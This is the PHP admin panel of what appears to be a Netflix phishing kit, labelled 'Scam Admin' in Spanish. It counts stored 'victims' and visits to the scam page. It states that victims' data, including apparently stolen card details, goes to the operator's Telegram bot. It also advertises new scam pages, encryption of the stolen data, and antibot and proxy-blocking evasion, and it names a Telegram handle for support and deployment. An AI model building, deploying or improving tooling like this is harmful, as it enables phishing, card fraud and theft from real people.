<?php
session_start();
if (isset($_SESSION['logueado']) and $_SESSION['logueado']) {
    $nombre = $_SESSION['nombre'];
} else {
    //Si el usuario no está logueado redireccionamos al login.
    header('Location: login.php');
    exit;
}

//Se requiere Contador de Visitas
require("../contador-visitas.php");

//? Abrir archivo db.json con permisos de lectura
$handler = fopen("db.json", "r");


?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix</title>
    <link rel="shortcut icon" href="../img/icon.ico" type="image/x-icon">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <link rel="stylesheet" href="css/index.css">
    <title>Hello, world!</title>

</head>

<body>
    <div class="animate__animated animate__fadeInLeft">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <div class="container">
                <a class="navbar-brand" href="index.php">Scam Admin</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-item">
                            <a class="nav-link active" aria-current="page" href="#">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="pages/stats.php">Datos</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="../Valid-1/index.php">Ir Al Index del Scam</a>
                        </li>
                    </ul>
                    <ul class="navbar-nav me-0 mb-2 mb-lg-0 ">
                        <li class="nav-item">
                            <a class="nav-link" href="#" tabindex="-1" aria-disabled="true"><img src="img/sayhitogabe.jpg" alt="" class="img-user"><span class="hidden-xs">@SelsiusRC28</span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link btn btn-primary text-white " href="cerrar_sesion.php" tabindex="-1" aria-disabled="true">Cerrar Sesion</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <h1 class="text-white text-center mb-5 mt-3 shadow p-3 mb-5 rounded-pill">Configura el Panel Admin y el envio de datos desde ./config.php</h1>
        <div class="container mt-3">
            <div class="row row-cols-1 row-cols-md-3 g-4 ">
                <div class="col">
                    <div class="card text-white bg-success mb-3">
                        <img src="img/tarjetas.jpg" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">Victimas</h5>
                            <p class="card-text">Los datos de los que fueron victimas llegaran a tu bot de telegram, esta web no almacena por motivos de seguridad :)</p>
                            <a href="#" class="btn btn-dark"> <?php
                                                                //? Leyendo archivo y pasando a la variable $file como array a $arrayJson
                                                                if ($handler && filesize("db.json") != 0) {
                                                                    $file = fread($handler, filesize("db.json"));
                                                                    //? interpreta el contenido del db.jon con formato json, si esta vacio, inserta un array vacio.
                                                                    $arrayJson = json_decode($file ?? []);
                                                                    echo count($arrayJson);
                                                                } else {
                                                                    $file = null;
                                                                    //? interpreta el contenido del db.jon con formato json, si esta vacio, inserta un array vacio.
                                                                    $arrayJson = [];
                                                                    echo "0";
                                                                }
                                                                ?></a>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-primary mb-3">
                        <img src="img/pagina.jpeg" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">Visitas deL Scams</h5>
                            <p class="card-text">Personas que entraron a tu Scam</p>
                            <a href="#" class="btn btn-dark"><?php
                                                                echo contadorvisitas(0, "contador-visitas.txt");
                                                                ?></a>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-dark mb-3">
                        <img src="../img/netflix-inicio-valid-1.jpg" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">Soporte del Scam</h5>
                            <p class="card-text">El soporte, asesoramiento, deploy, consultas a mi Telegram: @SelsiusRC28</p>
                            <p>CCS FULL Data base Scam Netflix :D</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <h1 class="text-white text-center mb-5 mt-3 shadow-lg p-3 my-5 rounded-pill">Actualizacion Scam Netflix 2021 v3</h1>
        <div class="container mt-3">
            <div class="row row-cols-1 row-cols-md-3 g-4 ">
                <div class="col">
                    <div class="card text-white bg-secondary mb-3">
                        <img src="./img/3.PNG" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">New Page</h5>
                            <p class="card-text">Nueva Pagina de Scam</p>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-secondary mb-3">
                        <img src="./img/4.PNG" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">New Page</h5>
                            <p class="card-text">Nueva Pagina de Scam</p>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-secondary mb-3">
                        <img src="./img/1.PNG" class="card-img-top" alt="...">
                        <div class="card-body">
                            <h5 class="card-title">Encriptamiento de Datos</h5>
                            <p class="card-text">Se Agrego nuevo Script Privado para encriptamiento de los datos json</p>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-dark mb-3">
                        <img src="./img/2.jpg" class="card-img-top" alt="..." style="width: 200px; margin: 0px auto">
                        <div class="card-body">
                            <h5 class="card-title">Nuevo Formato de Envio</h5>
                            <p class="card-text">Nuevo formato del bot de Telegram</p>
                        </div>
                    </div>
                </div>
                <div class="col">
                    <div class="card text-white bg-dark mb-3">
                        <img src="./img/antibot.png" class="card-img-top" alt="..." style="width: 100%;">
                        <div class="card-body">
                            <h5 class="card-title">UPDATE Antibot</h5>
                            <p class="card-text">Se actualizaron los antibot y se agregaron script para bloqueo de proxy</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>



    </div>
</body>
<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>

</html>